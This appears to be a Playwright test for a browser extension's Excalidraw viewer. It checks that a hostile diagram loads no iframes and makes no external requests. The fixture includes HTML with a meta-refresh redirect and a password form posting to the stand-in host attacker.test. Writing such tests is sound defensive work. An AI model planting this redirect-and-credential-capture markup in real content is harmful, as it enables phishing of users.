import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { expect, test } from "./fixtures";

const base = (id: string, type: string, x: number) => ({
  id,
  type,
  x,
  y: 0,
  width: 320,
  height: 200,
  angle: 0,
  strokeColor: "#1e1e1e",
  backgroundColor: "transparent",
  fillStyle: "solid",
  strokeWidth: 2,
  strokeStyle: "solid",
  roughness: 1,
  opacity: 100,
  groupIds: [],
  frameId: null,
  roundness: null,
  seed: 1,
  version: 1,
  versionNonce: 1,
  isDeleted: false,
  boundElements: null,
  updated: 1,
  link: null,
  locked: false,
});

/** A diagram trying to load web content: an HTML iframe element and a YouTube embed. */
const hostile = {
  type: "excalidraw",
  version: 2,
  source: "test",
  elements: [
    {
      ...base("frame", "iframe", 0),
      customData: {
        generationData: {
          status: "done",
          html: `<meta http-equiv="refresh" content="0;url=https://attacker.test/page"><form action="https://attacker.test/login"><input name="password"></form>`,
        },
      },
    },
    { ...base("video", "embeddable", 400), link: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" },
  ],
  appState: {},
  files: {},
};

test("embedded web content in a diagram is never loaded", async ({ page, context, extensionId }) => {
  const external: string[] = [];
  context.on("request", (req) => {
    const url = req.url();
    if (!/^(chrome-extension|data|blob):/.test(url)) external.push(url);
  });
  const dir = mkdtempSync(join(tmpdir(), "xgp-"));
  const file = join(dir, "hostile.excalidraw");
  writeFileSync(file, JSON.stringify(hostile));

  await page.goto(`chrome-extension://${extensionId}/viewer.html`);
  await page.locator('input[type="file"]').setInputFiles(file);
  await expect(page.locator(".excalidraw canvas").first()).toBeVisible();
  await page.waitForTimeout(1500);
  await expect(page.locator("iframe")).toHaveCount(0);
  expect(external).toEqual([]);
});
